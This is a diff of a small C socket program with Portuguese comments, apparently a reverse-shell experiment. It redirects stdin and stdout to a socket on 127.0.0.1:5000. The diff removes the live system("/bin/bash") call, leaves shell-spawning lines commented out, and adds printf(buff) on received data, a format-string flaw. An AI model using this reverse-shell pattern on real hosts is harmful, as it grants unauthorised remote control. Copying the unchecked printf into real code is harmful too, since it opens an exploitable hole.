@@ -9,7 +9,6 @@
 
 
 char buff[1000];
-char *msg = "cheguei";
 char *shell = "/bin/sh";
 
 int main(void){
@@ -21,7 +20,7 @@ int main(void){
     struct sockaddr_in dadosSv;
     dadosSv.sin_family = AF_INET;
     dadosSv.sin_port = htons(5000);
-    dadosSv.sin_addr.s_addr = INADDR_ANY; // INADDR_ANY = localhost
+    dadosSv.sin_addr.s_addr = inet_addr("127.0.0.1"); // INADDR_ANY = localhost
     memset(&dadosSv.sin_zero, 0, sizeof(dadosSv.sin_zero));
     
 
@@ -30,13 +29,16 @@ int main(void){
     if ((connect(fSock, (struct sockaddr *)&dadosSv, tDadosSv)) < 0)
 	puts("erro ao conectar");
 
-    send(fSock, msg, strlen(msg), 0);
-    
     dup2(fSock, fileno(stdin));   // entrada padrao trocada pelo socket
     dup2(fSock, fileno(stdout));  // saida padrao trocada pelo socket
-    system("/bin/bash");
-    //execl(shell, "/bin/sh", (char*)0);
 
+
+    //dup2(fSock, fileno(stderr));  // saida de erro trocada pelo socket
+    //system("/bin/bash");
+    //execl(shell, "/bin/sh", (char*)0);
+    
+    recv(fSock, buff, sizeof(buff), 0);
+    printf(buff);
     return 0;
 }
 
